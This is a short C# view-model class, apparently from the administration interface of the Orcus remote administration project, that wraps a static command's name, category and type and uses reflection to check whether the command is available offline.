using System;
using System.Reflection;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;

namespace Orcus.Administration.ViewModels.Main
{
    public class StaticCommandItem
    {
        public StaticCommandItem(StaticCommand staticCommand)
        {
            Name = staticCommand.Name;
            Category = staticCommand.Category.Name;
            StaticCommandType = staticCommand.GetType();
            OfflineAvailable = StaticCommandType.GetCustomAttribute<OfflineAvailableAttribute>() != null;
        }

        public bool OfflineAvailable { get; set; }
        public string Category { get; }
        public string Name { get; }
        public Type StaticCommandType { get; }
    }
}